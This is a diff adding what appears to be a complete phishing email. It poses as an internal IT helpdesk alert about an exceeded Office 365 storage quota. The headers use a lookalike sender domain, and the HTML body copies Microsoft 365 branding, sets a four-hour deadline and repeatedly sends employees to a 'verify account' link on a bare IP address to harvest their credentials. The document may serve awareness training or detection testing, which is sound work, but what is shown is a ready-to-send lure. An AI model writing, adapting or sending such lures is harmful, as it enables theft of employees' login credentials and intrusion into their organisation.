@@ -1,0 +1,213 @@
+From: it-helpdesk@company.onmicrosoft.services
+To: employees@company.com
+Subject: [IT ALERT] Critical: Office 365 Storage Quota Exceeded - Action Required
+Date: Thu, 18 Jan 2026 15:22:41 +0000
+Message-ID: <20260118152241.it.77234@company.onmicrosoft.services>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_O365_Notice"
+X-Mailer: Microsoft Outlook 16.0
+Thread-Index: AdqKx8f9Yw2Hj5pRQT8=
+X-MS-Exchange-Organization-AuthAs: Internal
+X-MS-Exchange-Organization-AuthSource: mail-relay.company.onmicrosoft.services
+X-Originating-IP: [103.224.182.244]
+Authentication-Results: spf=pass (sender IP is 103.224.182.244) smtp.mailfrom=company.onmicrosoft.services
+Received: from mail-relay.company.onmicrosoft.services (103.224.182.244) by mx.company.com
+
+------=_O365_Notice
+Content-Type: text/html; charset=UTF-8
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Office 365 Storage Notice</title>
+<style type="text/css">
+body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; }
+.wrapper { width: 100%; background-color: #f4f4f4; padding: 20px 0; }
+.container { max-width: 650px; margin: 0 auto; background-color: #ffffff; border: 1px solid #e0e0e0; }
+.header { background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); padding: 30px; text-align: center; }
+.content { padding: 35px 40px; }
+.alert { background-color: #fff4ce; border-left: 6px solid #ffb900; padding: 18px; margin: 25px 0; }
+.stats-table { width: 100%; border-collapse: collapse; margin: 25px 0; }
+.stats-table td { padding: 12px; border: 1px solid #e0e0e0; }
+.stats-table tr:nth-child(even) { background-color: #f9f9f9; }
+.button { display: inline-block; padding: 16px 35px; background-color: #0078d4; color: #ffffff !important; text-decoration: none; border-radius: 4px; font-weight: 600; font-size: 15px; margin: 20px 0; }
+.footer { background-color: #f8f8f8; padding: 25px 40px; font-size: 12px; color: #666666; border-top: 1px solid #e0e0e0; }
+.critical { color: #d13438; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="wrapper">
+<div class="container">
+
+<div class="header">
+<table width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td style="text-align: center;">
+<div style="background: white; display: inline-block; padding: 12px 25px; border-radius: 4px;">
+<span style="font-size: 28px; font-weight: 700; color: #0078d4;">Microsoft</span>
+<span style="font-size: 20px; color: #737373; margin-left: 8px;">365</span>
+</div>
+<h2 style="color: white; margin: 20px 0 5px 0; font-size: 22px;">IT Services Department</h2>
+<p style="color: #e0e0e0; margin: 0; font-size: 14px;">company.onmicrosoft.com</p>
+</td>
+</tr>
+</table>
+</div>
+
+<div class="content">
+<div class="alert">
+<table width="100%" cellpadding="0" cellspacing="0">
+<tr>
+<td style="width: 40px; vertical-align: top; font-size: 28px;">⚠️</td>
+<td>
+<p style="margin: 0; color: #323130; font-weight: 600; font-size: 16px;">CRITICAL STORAGE ALERT</p>
+<p style="margin: 5px 0 0 0; color: #605e5c; font-size: 14px;">Your mailbox has exceeded its allocated storage quota</p>
+</td>
+</tr>
+</table>
+</div>
+
+<p style="color: #323130; font-size: 15px; line-height: 1.7; margin-top: 0;">
+Dear Employee,
+</p>
+
+<p style="color: #323130; font-size: 15px; line-height: 1.7;">
+Our system has detected that your Office 365 mailbox is currently <span class="critical">98.7% full</span> and has exceeded the standard 50GB allocation. This is affecting your ability to send and receive emails.
+</p>
+
+<table class="stats-table">
+<tr>
+<td style="font-weight: 600; width: 50%;">Current Storage Used:</td>
+<td style="color: #d13438; font-weight: 600;">49.35 GB / 50 GB</td>
+</tr>
+<tr>
+<td style="font-weight: 600;">Available Space:</td>
+<td style="color: #d13438; font-weight: 600;">650 MB (1.3%)</td>
+</tr>
+<tr>
+<td style="font-weight: 600;">Account Status:</td>
+<td style="color: #d13438; font-weight: 600;">⚠️ QUOTA EXCEEDED</td>
+</tr>
+<tr>
+<td style="font-weight: 600;">Email Delivery:</td>
+<td style="color: #d13438; font-weight: 600;">RESTRICTED</td>
+</tr>
+<tr>
+<td style="font-weight: 600;">Last Checked:</td>
+<td>2026-01-18 15:20:15 UTC</td>
+</tr>
+</table>
+
+<div style="background: #ffebee; border-left: 6px solid #d13438; padding: 18px; margin: 25px 0;">
+<p style="margin: 0; color: #c62828; font-weight: 600; font-size: 15px;">
+⛔ IMMEDIATE ACTION REQUIRED
+</p>
+<p style="margin: 10px 0 0 0; color: #5f2120; font-size: 14px; line-height: 1.6;">
+To prevent permanent email delivery failure and potential data loss, you must verify your account and approve an automatic storage expansion to 100GB within the next <b>4 hours</b>.
+</p>
+</div>
+
+<p style="color: #323130; font-size: 15px; line-height: 1.7;">
+<b>Required Actions:</b>
+</p>
+
+<ol style="color: #323130; font-size: 15px; line-height: 1.7; margin-left: 20px;">
+<li>Click the verification button below to authenticate your identity</li>
+<li>Review and approve the storage quota increase request</li>
+<li>Confirm your email delivery preferences</li>
+<li>Update your account security settings if prompted</li>
+</ol>
+
+<div style="text-align: center; margin: 35px 0;">
+<a href="http://103.224.182.244/microsoft365/storage-verification/authenticate?user=employee&quota=50GB" class="button">
+VERIFY ACCOUNT & INCREASE STORAGE
+</a>
+</div>
+
+<p style="color: #323130; font-size: 14px; line-height: 1.7; background: #e8f4fd; padding: 15px; border-radius: 4px;">
+<b>💡 Alternative Access:</b> If the button above doesn't work, copy and paste this secure link into your browser:<br>
+<span style="font-family: 'Courier New', monospace; font-size: 12px; color: #0078d4; word-break: break-all;">
+http://103.224.182.244/microsoft365/storage-verification/authenticate?user=employee&quota=50GB&session=o365_storage_77234
+</span>
+</p>
+
+<p style="color: #605e5c; font-size: 13px; line-height: 1.6; margin-top: 30px;">
+<b>Why is this happening?</b><br>
+This typically occurs when you have accumulated a large number of emails with attachments, or when shared files in OneDrive/SharePoint are counted toward your quota. Our IT team has pre-approved a storage increase for all affected users.
+</p>
+
+<p style="color: #323130; font-size: 15px; line-height: 1.7; margin-top: 25px;">
+If you have any questions or require assistance, please contact the IT Help Desk:
+</p>
+
+<ul style="color: #323130; font-size: 14px; line-height: 1.6; list-style: none; padding-left: 0;">
+<li>📞 Phone: ext. 2500 (Internal) / +1-555-0199 (External)</li>
+<li>📧 Email: it-helpdesk@company.com</li>
+<li>💬 Teams: IT Support Channel</li>
+<li>🕐 Hours: Monday-Friday, 8:00 AM - 6:00 PM EST</li>
+</ul>
+
+<p style="color: #323130; font-size: 15px; line-height: 1.7; margin-top: 25px;">
+Best regards,<br>
+<b>IT Services Department</b><br>
+Information Technology Division<br>
+Company Name
+</p>
+
+</div>
+
+<div class="footer">
+<p style="margin: 0 0 15px 0; color: #323130; font-weight: 600;">System Information:</p>
+<table style="width: 100%; font-size: 11px; color: #666;">
+<tr>
+<td style="padding: 3px 0;"><b>Alert ID:</b></td>
+<td style="padding: 3px 0;">O365-STORAGE-2026-01-18-77234</td>
+</tr>
+<tr>
+<td style="padding: 3px 0;"><b>Tenant:</b></td>
+<td style="padding: 3px 0;">company.onmicrosoft.com</td>
+</tr>
+<tr>
+<td style="padding: 3px 0;"><b>Mail Server:</b></td>
+<td style="padding: 3px 0;">mail-relay.company.onmicrosoft.services</td>
+</tr>
+<tr>
+<td style="padding: 3px 0;"><b>Server IP:</b></td>
+<td style="padding: 3px 0;">103.224.182.244</td>
+</tr>
+<tr>
+<td style="padding: 3px 0;"><b>Message ID:</b></td>
+<td style="padding: 3px 0;">20260118152241.it.77234@company.onmicrosoft.services</td>
+</tr>
+<tr>
+<td style="padding: 3px 0;"><b>Generated:</b></td>
+<td style="padding: 3px 0;">2026-01-18 15:22:41 UTC</td>
+</tr>
+<tr>
+<td style="padding: 3px 0;"><b>Priority:</b></td>
+<td style="padding: 3px 0; color: #d13438; font-weight: 600;">URGENT - EXPIRES IN 4 HOURS</td>
+</tr>
+</table>
+
+<hr style="border: 0; border-top: 1px solid #e0e0e0; margin: 20px 0;">
+
+<p style="font-size: 11px; color: #999999; line-height: 1.5; margin: 15px 0 0 0;">
+This is an automated message from the IT Services Department. Please do not reply directly to this email. 
+This email was sent to all users who have exceeded 95% of their mailbox storage quota as part of our proactive 
+monitoring system. For security purposes, you may be required to re-authenticate when accessing the verification portal.
+</p>
+
+<p style="font-size: 11px; color: #999999; margin-top: 15px;">
+Microsoft and Office 365 are registered trademarks of Microsoft Corporation.<br>
+© 2026 Company Name. All rights reserved. | Internal IT Communication | Confidential
+</p>
+</div>
+
+</div>
+</div>
+</body>
+</html>
+
+------=_O365_Notice--
